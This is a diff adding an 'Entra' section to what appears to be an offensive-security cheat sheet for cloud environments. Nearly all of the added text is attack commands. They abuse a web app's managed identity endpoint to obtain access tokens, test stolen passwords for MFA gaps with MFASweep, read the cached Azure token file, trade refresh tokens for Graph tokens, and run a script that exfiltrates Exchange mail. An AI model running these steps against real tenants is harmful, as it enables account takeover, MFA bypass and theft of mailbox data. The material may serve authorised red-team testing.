@@ -5,6 +5,7 @@
 ## Table of Contents
 
 - [AWS](#aws)
+- [Entra](#entra)
 - [GraphRunner](#graphrunner)
 - [lazys3](#lazys3)
 
@@ -124,6 +125,88 @@ $ aws --endpoint-url http://127.0.0.1:4566 kms decrypt --ciphertext-blob mXMs+8Z
 ```c
 $ aws s3 ls s3://{<BUCKET>} --no-sign-request
 $ aws s3 ls s3://<COMPANY>
+```
+
+## Entra
+
+### Privilege Escalation
+
+> https://learn.microsoft.com/en-us/cli/azure/
+
+```c
+$ az login --service-principal -u "20acc5dd-ffv4-41ac-a1p5-d321328da49a" --certificate <CERTIFICATE>.pem --tenant "2590cdef-687d-493c-ae4d-442cbab53a72"
+```
+
+```c
+$ az resource list
+```
+
+```c
+$ az role assignment list --all
+```
+
+```c
+$ az webapp ssh --resource-group <GROUP> --name <NAME>
+```
+
+```c
+$ env
+```
+
+```c
+$ env | grep IDENTITY
+```
+
+```c
+$ curl -s -H "X-Identity-Header: $IDENTITY_HEADER" "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/”
+```
+
+```c
+$ Connect-AzAccount -AccessToken
+```
+
+### Token Abuse for MFA Bypass
+
+> https://github.com/dafthack/MFASweep/
+
+```c
+PS /> Import-Module ./MFASweep.ps1
+PS /> Invoke-MFASweep -Username <USERNAME>@<DOMAIN> -Password <PASSWORD>
+PS /> az login -u <USERNAME>@<DOMAIN> -p <PASSWORD>
+```
+
+```c
+PS /> cat  ~/.azure/msal_token_cache.json
+```
+
+or
+
+```c
+PS /> cat  ~/.Azure/msal_token_cache.json
+```
+
+> https://github.com/f-bader/TokenTacticsV2
+
+```c
+PS /> Import-Module .\TokenTactics.psm1
+PS /> Invoke-RefreshToMSGraphToken -domain <DOMAIN> -refreshToken "<TOKEN>"
+PS /> $MSGraphToken
+PS /> $MSGraphToken.access_token
+```
+
+or
+
+```c
+$ curl -s https://raw.githubusercontent.com/f-bader/TokenTacticsV2/main/modules/Get-
+ForgedUserAgent.ps1 | grep UserAgent | awk -F"= " '{ print $2 }' | sort -u
+```
+
+> https://github.com/rootsecdev/Azure-Red-Team
+
+> https://github.com/rootsecdev/Azure-Red-Team/blob/master/Tokens/exfil_exchange_mail.py
+
+```c
+PS /> python3 exfil_exchange_mail.py
 ```
 
 ## GraphRunner
